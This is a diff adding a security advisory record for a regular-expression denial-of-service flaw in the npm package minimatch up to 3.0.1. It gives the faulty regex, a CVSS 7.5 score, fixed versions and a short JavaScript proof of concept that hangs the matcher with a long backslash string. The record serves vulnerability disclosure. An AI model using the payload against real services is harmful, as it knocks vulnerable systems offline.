@@ -1,0 +1,46 @@
+advisory_id: npm-118
+datasource_id: nodejs_security_wg/npm-118
+datasource_url: https://github.com/nodejs/security-wg/blob/main/vuln/npm/118.json
+aliases: []
+summary: |
+  Regular Expression Denial of Service
+  Minimatch is a minimal matching utility that works by converting glob expressions into JavaScript `RegExp` objects.  The primary function, `minimatch(path, pattern)` is vulnerable to ReDoS in the `pattern` parameter.  This is because of the regular expression on line 521 of minimatch.js: `/((?:\\{2})*)(\\?)\|/g,`.  The problematic portion of the regex is `((?:\\{2})*)` which matches against `\\`.
+
+  A proof of concept is as follows:
+  ```
+  var minimatch = require(“minimatch”);
+
+  // utility function for generating long strings
+  var genstr = function (len, chr) {
+    var result = “”;
+    for (i=0; i<=len; i++) {
+      result = result + chr;
+    }
+    return result;
+  }
+
+  var exploit = “[!” + genstr(1000000, “\\”) + “A”;
+
+  // minimatch exploit.
+  console.log(“starting minimatch”);
+  minimatch(“foo”, exploit);
+  console.log(“finishing minimatch”);
+  ```
+impacted_packages:
+  - purl: pkg:npm/minimatch
+    affected_versions: vers:npm/<=3.0.1
+    fixed_versions: vers:npm/>=3.0.2
+severities:
+  - score: '7.5'
+    scoring_system: cvssv3
+    scoring_elements: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
+    published_at: None
+    url: https://github.com/nodejs/security-wg/blob/main/vuln/npm/118.json
+weaknesses: []
+references:
+  - url: https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS
+    reference_type:
+    reference_id:
+  - url: https://github.com/nodejs/security-wg/blob/main/vuln/npm/118.json
+    reference_type:
+    reference_id: 118
